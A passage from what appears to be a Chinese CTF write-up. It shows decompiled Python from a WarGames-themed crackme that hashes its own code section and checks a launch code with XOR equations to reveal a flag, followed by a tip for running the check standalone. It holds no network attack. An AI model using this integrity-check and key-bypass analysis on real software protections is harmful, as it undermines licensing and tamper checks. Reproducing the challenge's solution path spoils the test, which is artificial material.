REVOLUTION&#x27;</span>, <span class="string">&#x27;ALBANIAN DECOY&#x27;</span>, <span class="string">&#x27;PALESTINIAN LOCAL&#x27;</span>, <span class="string">&#x27;MOROCCAN MINIMAL&#x27;</span>, <span class="string">&#x27;BAVARIAN DIVERSITY&#x27;</span>, <span class="string">&#x27;CZECH OPTION&#x27;</span>, <span class="string">&#x27;FRENCH ALLIANCE&#x27;</span>, <span class="string">&#x27;ARABIAN CLANDESTINE&#x27;</span>, <span class="string">&#x27;GABON REBELLION&#x27;</span>, <span class="string">&#x27;NORTHERN MAXIMUM&#x27;</span>, <span class="string">&#x27;DANISH PARAMILITARY&#x27;</span>, <span class="string">&#x27;SEATO TAKEOVER&#x27;</span>, <span class="string">&#x27;HAWAIIAN ESCALATION&#x27;</span>, <span class="string">&#x27;IRANIAN MANEUVER&#x27;</span>, <span class="string">&#x27;NATO CONTAINMENT&#x27;</span>, <span class="string">&#x27;SWISS INCIDENT&#x27;</span>, <span class="string">&#x27;CUBAN MINIMAL&#x27;</span>, <span class="string">&#x27;CHAD ALERT&#x27;</span>, <span class="string">&#x27;ICELAND ESCALATION&#x27;</span>, <span class="string">&#x27;VIETNAMESE RETALIATION&#x27;</span>, <span class="string">&#x27;SYRIAN PROVOCATION&#x27;</span>, <span class="string">&#x27;LIBYAN LOCAL&#x27;</span>, <span class="string">&#x27;GABON TAKEOVER&#x27;</span>, <span class="string">&#x27;ROMANIAN WAR&#x27;</span>, <span class="string">&#x27;MIDDLE EAST OFFENSIVE&#x27;</span>, <span class="string">&#x27;DENMARK MASSIVE&#x27;</span>, <span class="string">&#x27;CHILE CONFRONTATION&#x27;</span>, <span class="string">&#x27;S.AFRICAN SUBVERSION&#x27;</span>, <span class="string">&#x27;USSR ALERT&#x27;</span>, <span class="string">&#x27;NICARAGUAN THRUST&#x27;</span>, <span class="string">&#x27;GREENLAND DOMESTIC&#x27;</span>, <span class="string">&#x27;ICELAND HEAVY&#x27;</span>, <span class="string">&#x27;KENYA OPTION&#x27;</span>, <span class="string">&#x27;PACIFIC DEFENSE&#x27;</span>, <span class="string">&#x27;UGANDA MAXIMUM&#x27;</span>, <span class="string">&#x27;THAI SUBVERSION&#x27;</span>, <span class="string">&#x27;ROMANIAN STRIKE&#x27;</span>, <span class="string">&#x27;PAKISTAN SOVEREIGNTY&#x27;</span>, <span class="string">&#x27;AFGHAN MISDIRECTION&#x27;</span>, <span class="string">&#x27;ETHIOPIAN LOCAL&#x27;</span>, <span class="string">&#x27;ITALIAN TAKEOVER&#x27;</span>, <span class="string">&#x27;VIETNAMESE INCIDENT&#x27;</span>, <span class="string">&#x27;ENGLISH PREEMPTIVE&#x27;</span>, <span class="string">&#x27;DENMARK ALTERNATE&#x27;</span>, <span class="string">&#x27;THAI CONFRONTATION&#x27;</span>, <span class="string">&#x27;TAIWAN SURPRISE&#x27;</span>, <span class="string">&#x27;BRAZILIAN STRIKE&#x27;</span>, <span class="string">&#x27;VENEZUELA SUDDEN&#x27;</span>, <span class="string">&#x27;MALAYSIAN ALERT&#x27;</span>, <span class="string">&#x27;ISREAL DISCRETIONARY&#x27;</span>, <span class="string">&#x27;LIBYAN ACTION&#x27;</span>, <span class="string">&#x27;PALESTINIAN TACTICAL&#x27;</span>, <span class="string">&#x27;NATO ALTERNATE&#x27;</span>, <span class="string">&#x27;CYPRESS MANEUVER&#x27;</span>, <span class="string">&#x27;EGYPT MISDIRECTION&#x27;</span>, <span class="string">&#x27;BANGLADESH THRUST&#x27;</span>, <span class="string">&#x27;KENYA DEFENSE&#x27;</span>, <span class="string">&#x27;BANGLADESH CONTAINMENT&#x27;</span>, <span class="string">&#x27;VIETNAMESE STRIKE&#x27;</span>, <span class="string">&#x27;ALBANIAN CONTAINMENT&#x27;</span>, <span class="string">&#x27;GABON SURPRISE&#x27;</span>, <span class="string">&#x27;IRAQ SOVEREIGNTY&#x27;</span>, <span class="string">&#x27;VIETNAMESE SUDDEN&#x27;</span>, <span class="string">&#x27;LEBANON INTERDICTION&#x27;</span>, <span class="string">&#x27;TAIWAN DOMESTIC&#x27;</span>, <span class="string">&#x27;ALGERIAN SOVEREIGNTY&#x27;</span>, <span class="string">&#x27;ARABIAN STRIKE&#x27;</span>, <span class="string">&#x27;ATLANTIC SUDDEN&#x27;</span>, <span class="string">&#x27;MONGOLIAN THRUST&#x27;</span>, <span class="string">&#x27;POLISH DECOY&#x27;</span>, <span class="string">&#x27;ALASKAN DISCRETIONARY&#x27;</span>, <span class="string">&#x27;CANADIAN THRUST&#x27;</span>, <span class="string">&#x27;ARABIAN LIGHT&#x27;</span>, <span class="string">&#x27;S.AFRICAN DOMESTIC&#x27;</span>, <span class="string">&#x27;TUNISIAN INCIDENT&#x27;</span>, <span class="string">&#x27;MALAYSIAN MANEUVER&#x27;</span>, <span class="string">&#x27;JAMAICA DECOY&#x27;</span>, <span class="string">&#x27;MALAYSIAN MINIMAL&#x27;</span>, <span class="string">&#x27;RUSSIAN SOVEREIGNTY&#x27;</span>, <span class="string">&#x27;CHAD OPTION&#x27;</span>, <span class="string">&#x27;BANGLADESH WAR&#x27;</span>, <span class="string">&#x27;BURMESE CONTAINMENT&#x27;</span>, <span class="string">&#x27;ASIAN THEATERWIDE&#x27;</span>, <span class="string">&#x27;BULGARIAN CLANDESTINE&#x27;</span>, <span class="string">&#x27;GREENLAND INCURSION&#x27;</span>, <span class="string">&#x27;EGYPT SURGICAL&#x27;</span>, <span class="string">&#x27;CZECH HEAVY&#x27;</span>, <span class="string">&#x27;TAIWAN CONFRONTATION&#x27;</span>, <span class="string">&#x27;GREENLAND MAXIMUM&#x27;</span>, <span class="string">&#x27;UGANDA OFFENSIVE&#x27;</span>, <span class="string">&#x27;CASPIAN DEFENSE&#x27;</span>, <span class="string">&#x27;CRIMEAN GAMBIT&#x27;</span>, <span class="string">&#x27;BRITISH ANTICS&#x27;</span>, <span class="string">&#x27;HUNGARIAN EXPULSION&#x27;</span>, <span class="string">&#x27;VENEZUELAN COLLAPSE&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrong</span>():</span></span><br><span class="line">    trust = windll.kernel32.GetModuleHandleW(<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    computer = string_at(trust, <span class="number">1024</span>)</span><br><span class="line">    dirty, = struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, computer, <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">    _, _, organize, _, _, _, variety, _ =  struct.unpack_from(<span class="string">&#x27;=IHHIIIHH&#x27;</span>, computer, dirty)</span><br><span class="line">    <span class="keyword">assert</span> variety &gt;= <span class="number">144</span></span><br><span class="line"></span><br><span class="line">    participate, = struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, computer, dirty + <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">for</span> insurance <span class="keyword">in</span> range(organize):</span><br><span class="line">        name, tropical, inhabitant, reader, chalk, _, _, _, _, _ = struct.unpack_from(<span class="string">&#x27;=8sIIIIIIHHI&#x27;</span>, computer, <span class="number">40</span> * insurance + dirty + variety + <span class="number">24</span>)</span><br><span class="line">        <span class="keyword">if</span> inhabitant &lt;= participate &lt; inhabitant + tropical:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    spare = bytearray(string_at(trust + inhabitant, tropical))</span><br><span class="line">    </span><br><span class="line">    issue, digital = struct.unpack_from(<span class="string">&#x27;=II&#x27;</span>, computer, dirty + <span class="number">0xa0</span>)</span><br><span class="line">    truth = string_at(trust + issue, digital)</span><br><span class="line"></span><br><span class="line">    expertise = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> expertise &lt;= len(truth) - <span class="number">8</span>:</span><br><span class="line">        nuance, seem = struct.unpack_from(<span class="string">&#x27;=II&#x27;</span>, truth, expertise)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> nuance == <span class="number">0</span> <span class="keyword">and</span> seem == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        slot = truth[expertise + <span class="number">8</span>:expertise + seem]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(slot) &gt;&gt; <span class="number">1</span>):</span><br><span class="line">            diet, = struct.unpack_from(<span class="string">&#x27;=H&#x27;</span>, slot, <span class="number">2</span> * i)</span><br><span class="line">            fabricate = diet &gt;&gt; <span class="number">12</span></span><br><span class="line">            <span class="keyword">if</span> fabricate != <span class="number">3</span>: <span class="keyword">continue</span></span><br><span class="line">            diet = diet &amp; <span class="number">4095</span></span><br><span class="line">            ready = nuance + diet - inhabitant</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= ready &lt; len(spare): </span><br><span class="line">                struct.pack_into(<span class="string">&#x27;=I&#x27;</span>, spare, ready, struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, spare, ready)[<span class="number">0</span>] - trust)</span><br><span class="line"></span><br><span class="line">        expertise += seem</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(spare).digest()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Terminal</span>(<span class="params">object</span>):</span></span><br><span class="line">        </span><br><span class="line">    DELAY = <span class="number">0.02</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> text.splitlines(<span class="literal">True</span>):</span><br><span class="line">            sys.stdout.write(line)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            time.sleep(self.DELAY)     </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">typewrite</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">if</span> char == <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">                sys.stdout.write(char)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                time.sleep(self.DELAY)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                sys.stdout.write(char.lower())</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                time.sleep(self.DELAY)</span><br><span class="line">                sys.stdout.write(<span class="string">&#x27;\b&#x27;</span> + char)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">typewriteln</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        self.typewrite(text + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join(<span class="string">&#x27;&#x27;</span>.join(_ <span class="keyword">for</span> _ <span class="keyword">in</span> input().upper() <span class="keyword">if</span> _ <span class="keyword">in</span> <span class="string">&#x27; 0123456789ABCDEFGHIJKLMNOPQRSTUVWXZY?&#x27;</span>).split())</span><br><span class="line">t = Terminal()</span><br><span class="line"></span><br><span class="line">xor = [<span class="number">212</span>, <span class="number">162</span>, <span class="number">242</span>, <span class="number">218</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">249</span>, <span class="number">83</span>, <span class="number">55</span>, <span class="number">187</span>, <span class="number">131</span>, <span class="number">206</span>]</span><br><span class="line">h = list(wrong())</span><br><span class="line">h = [h[i] ^ xor[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">t.write(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">      _/\/\______/\/\____/\/\/\/\____/\/\/\/\/\____/\/\/\/\/\___</span></span><br><span class="line"><span class="string">     _/\/\__/\__/\/\__/\/\____/\/\__/\/\____/\/\__/\/\____/\/\_</span></span><br><span class="line"><span class="string">    _/\/\/\/\/\/\/\__/\/\____/\/\__/\/\/\/\/\____/\/\/\/\/\___</span></span><br><span class="line"><span class="string">   _/\/\/\__/\/\/\__/\/\____/\/\__/\/\__________/\/\__/\/\___</span></span><br><span class="line"><span class="string">  _/\/\______/\/\____/\/\/\/\____/\/\__________/\/\____/\/\_</span></span><br><span class="line"><span class="string"> __________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t.typewrite(<span class="string">&#x27;GREETINGS PROFESSOR FALKEN.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    t.typewrite(<span class="string">&#x27;\n&gt; &#x27;</span>)</span><br><span class="line">    cmd = t.read()</span><br><span class="line">    <span class="keyword">if</span> cmd.rstrip(<span class="string">&#x27;!?&#x27;</span>) <span class="keyword">in</span> GREETINGS:</span><br><span class="line">        t.typewriteln(random.choice(GREETINGS))</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&#x27;HELP GAMES&#x27;</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&quot;&#x27;GAMES&#x27; REFERS TO MODELS, SIMULATIONS AND GAMES\nWHICH HAVE TACTICAL AND STRATEGIC APPLICATIONS.&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&#x27;LIST GAMES&#x27;</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;FALKEN\&#x27;S MAZE\nTIC-TAC-TOE\nGLOBAL THERMONUCLEAR WAR&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd <span class="keyword">in</span> (<span class="string">&#x27;HELP&#x27;</span>, <span class="string">&#x27;?&#x27;</span>):</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;AVAILABLE COMMANDS:\nHELP\nHELP GAMES\nLIST GAMES\nPLAY &lt;game&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd.startswith(<span class="string">&#x27;HELP &#x27;</span>):</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;HELP NOT AVAILABLE&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&#x27;PLAY&#x27;</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;WHICH GAME?&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd.startswith(<span class="string">&#x27;PLAY F&#x27;</span>) <span class="keyword">or</span> cmd == <span class="string">&#x27;PLAY 1&#x27;</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;GAME IS TEMPORARILY UNAVAILABLE DUE TO MAINTENANCE&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd.startswith(<span class="string">&#x27;PLAY T&#x27;</span>) <span class="keyword">or</span> cmd == <span class="string">&#x27;PLAY 2&#x27;</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;GAME IS TEMPORARILY UNAVAILABLE DUE TO MAINTENANCE&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd.startswith(<span class="string">&#x27;PLAY G&#x27;</span>) <span class="keyword">or</span> cmd <span class="keyword">in</span> (<span class="string">&#x27;PLAY ARMAGEDDON&#x27;</span>, <span class="string">&#x27;PLAY 3&#x27;</span>):</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;*** GAME ROUTINE RUNNING ***&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> cmd.startswith(<span class="string">&#x27;PLAY &#x27;</span>):</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;THAT GAME IS NOT AVAILABLE&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;COMMAND NOT RECOGNIZED&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t.write(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">r&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;7ooooo&quot;&quot;&quot;oooooo&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;7</span></span><br><span class="line"><span class="string">|           .__Looooooo &quot;&quot;7oooooooo`     &#x27;ooo&quot;   &quot;&quot;._,    .JooL_,    .___     |</span></span><br><span class="line"><span class="string">o  __L______oLoooooooo7o_, |oooor&quot;&quot;       ._____,,Jo__JoooooooooooooJoooL_____J</span></span><br><span class="line"><span class="string">r7._ooooooooooooooo&quot;JoJoo|  oor   &#x27;o`   .Jooo7oooooooooooooooooooooooooooo&quot;oo&quot;7</span></span><br><span class="line"><span class="string">| &#x27;`&quot;&#x27;`   ooooooooooL,Jooo_,         _oL.ooLoooooooooooooooooooooooooo_  |r`  |</span></span><br><span class="line"><span class="string">|         &#x27;&#x27;ooooooooooooooJo         &quot;&quot;oooooooooor&quot;ooooooooooooooooooo7       |</span></span><br><span class="line"><span class="string">|           7oooooooooo&quot;             |or`oo&#x27;ooJoJo |ooooooooooooooro ./       |</span></span><br><span class="line"><span class="string">|            &quot;oooooo7o`              JooooJ_JLJoooLJoooooooooooooo, or        |</span></span><br><span class="line"><span class="string">|             &#x27;&quot;oo|  oo            .oooooooooooroooJo&quot;7oooooooooo7,           |</span></span><br><span class="line"><span class="string">|   &quot;&quot;          &quot;&quot;`oorL|L,         |ooooooooooooooo&quot;`  7or` 7ooo |,           |</span></span><br><span class="line"><span class="string">|                   &#x27;\_oL__         7ooooooooooooLr     7|   L&quot;` |o|          |</span></span><br><span class="line"><span class="string">|                    .Jooooo|            7ooooooo&quot;       `  &#x27;o|_oL&quot;L          |</span></span><br><span class="line"><span class="string">|                    |oooooooooL         &#x27;oooooo|            &#x27;o_J7Lrooo_J_,   |</span></span><br><span class="line"><span class="string">|                     7oooooooo`          Jooooo|._            &quot;`&quot;7LJ/7r  &quot;`, |</span></span><br><span class="line"><span class="string">|                       oooooor           7oooo|.o|             __oooooo_  _| 7</span></span><br><span class="line"><span class="string">|                      |ooooo             &#x27;ooor  &quot;              7oooooooo|    |</span></span><br><span class="line"><span class="string">|                      Jooor               |o|                  &#x27;&quot;&quot;  &quot;oor    .J</span></span><br><span class="line"><span class="string">|                      oo|                                            &quot;o|   _oo</span></span><br><span class="line"><span class="string">|                     &#x27;or _                           |                     &quot; |</span></span><br><span class="line"><span class="string">|                      &quot;&quot;`                                                    |</span></span><br><span class="line"><span class="string">|                       .,&#x27;                       ___.   .______________      |</span></span><br><span class="line"><span class="string">|        ______________ooo`        ._JLooooooooooooooooooooooooooooooooooooo&quot; |</span></span><br><span class="line"><span class="string">|  |L7ooooooooooooooooL___,.Jo_Jooooooooooooooooooooooooooooooooooooooooooor` |</span></span><br><span class="line"><span class="string">ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">AWAITING FIRST STRIKE COMMAND</span></span><br><span class="line"><span class="string">-----------------------------</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">PLEASE SPECIFY PRIMARY TARGET</span></span><br><span class="line"><span class="string">BY CITY AND/OR COUNTRY NAME:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">target = input()</span><br><span class="line"></span><br><span class="line">t.typewriteln(<span class="string">&quot;\nPREPARING NUCLEAR STRIKE FOR &quot;</span> + target.upper())</span><br><span class="line">t.typewrite(<span class="string">&quot;ENTER LAUNCH CODE: &quot;</span>)</span><br><span class="line">launch_code = input().encode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># encoding map coordinates</span></span><br><span class="line">x = list(launch_code.ljust(<span class="number">16</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">b = <span class="number">16</span> * [<span class="literal">None</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># calculate missile trajectory</span></span><br><span class="line">b[<span class="number">0</span>] = x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">14</span>]</span><br><span class="line">b[<span class="number">1</span>] = x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>]</span><br><span class="line">b[<span class="number">2</span>] = x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">3</span>] = x[<span class="number">5</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">4</span>] = x[<span class="number">1</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">5</span>] = x[<span class="number">0</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">6</span>] = x[<span class="number">1</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">7</span>] = x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">14</span>]</span><br><span class="line">b[<span class="number">8</span>] = x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>]</span><br><span class="line">b[<span class="number">9</span>] = x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">10</span>] = x[<span class="number">0</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">11</span>] = x[<span class="number">0</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">13</span>]</span><br><span class="line">b[<span class="number">12</span>] = x[<span class="number">0</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">13</span>] = x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>]</span><br><span class="line">b[<span class="number">14</span>] = x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">15</span>] = x[<span class="number">1</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">15</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> b == h:</span><br><span class="line">    t.typewriteln(<span class="string">&quot;LAUNCH CODE ACCEPTED.\n\n*** RUNNING SIMULATION ***\n&quot;</span>)</span><br><span class="line">    random.shuffle(STRATEGIES)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(STRATEGIES), <span class="number">6</span>):</span><br><span class="line">        t.write(<span class="string">&#x27;\n&#x27;</span>.join(<span class="string">&#x27;&#123;:24&#125; &#123;:8&#125;&#x27;</span>.format(k, v) <span class="keyword">for</span> k, v <span class="keyword">in</span> ([(<span class="string">&#x27;STRATEGY:&#x27;</span>, <span class="string">&#x27;WINNER:&#x27;</span>), (<span class="string">&#x27;-&#x27;</span> * <span class="number">24</span>, <span class="string">&#x27;-&#x27;</span> * <span class="number">8</span>)] + [(_, <span class="string">&#x27;NONE&#x27;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> STRATEGIES[i:i+<span class="number">6</span>]])) + <span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    t.typewriteln(<span class="string">&quot;*** SIMULATION COMPLETED ***\n&quot;</span>)</span><br><span class="line">    t.typewriteln(<span class="string">&#x27;\nA STRANGE GAME.\nTHE ONLY WINNING MOVE IS\nNOT TO PLAY.\n&#x27;</span>)</span><br><span class="line">    eye = [<span class="number">219</span>, <span class="number">232</span>, <span class="number">81</span>, <span class="number">150</span>, <span class="number">126</span>, <span class="number">54</span>, <span class="number">116</span>, <span class="number">129</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">204</span>, <span class="number">119</span>, <span class="number">252</span>, <span class="number">122</span>, <span class="number">3</span>, <span class="number">209</span>, <span class="number">196</span>, <span class="number">15</span>, <span class="number">148</span>, <span class="number">173</span>, <span class="number">206</span>, <span class="number">246</span>, <span class="number">242</span>, <span class="number">200</span>, <span class="number">201</span>, <span class="number">167</span>, <span class="number">2</span>, <span class="number">102</span>, <span class="number">59</span>, <span class="number">122</span>, <span class="number">81</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">23</span>]</span><br><span class="line">    flag = fire(eye, launch_code).decode()</span><br><span class="line">    t.typewrite(<span class="string">f&quot;CONGRATULATIONS! YOU FOUND THE FLAG:\n\n<span class="subst">&#123;flag&#125;</span>\n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    t.typewrite(<span class="string">&quot;\nIDENTIFICATION NOT RECOGNIZED BY SYSTEM\n--CONNECTION TERMINATED--\n&quot;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822162824.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822162824.png"></a></p><p>当值为0的时候，会取本身进程的句柄，因为是单独跑python脚本的，所以得稍微改下，改成</p><p><code>    trust = pydll.LoadLibrary(r&#39;F:\copy.exe&#39;)._handle</code></p><p>完整代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span 